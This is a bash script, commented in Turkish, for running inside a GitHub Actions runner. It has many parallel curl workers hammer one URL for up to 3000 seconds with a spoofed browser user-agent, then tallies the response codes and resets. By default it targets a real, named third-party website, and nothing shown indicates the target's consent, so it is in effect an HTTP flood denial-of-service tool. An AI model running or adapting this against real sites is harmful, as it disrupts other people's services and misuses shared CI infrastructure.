#!/usr/bin/env bash
# GitHub Actions runner içinde çalışır: belirtilen eşzamanlılıkta sürekli istek atar.
# Kullanım: ./run.sh <concurrency> <seconds> [url]
set -u
C="${1:-25}"
DUR="${2:-3000}"
URL="${3:-https://www.antalyatransferi.com/}"

END=$(( $(date +%s) + DUR ))
export END URL

seq 1 "$C" | xargs -P "$C" -I{} bash -c '
  while [ "$(date +%s)" -lt "$END" ]; do
    curl -sS -o /dev/null --max-time 25 \
      -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0" \
      -H "Accept-Encoding: gzip, br" \
      -H "Accept: text/html,*/*" \
      -w "%{http_code}\n" "$URL" >> /tmp/kod.$$ 2>/dev/null || echo RST >> /tmp/kod.$$
  done
'
echo "--- ozet ---"
sort /tmp/kod.* 2>/dev/null | uniq -c | sort -rn | head -20
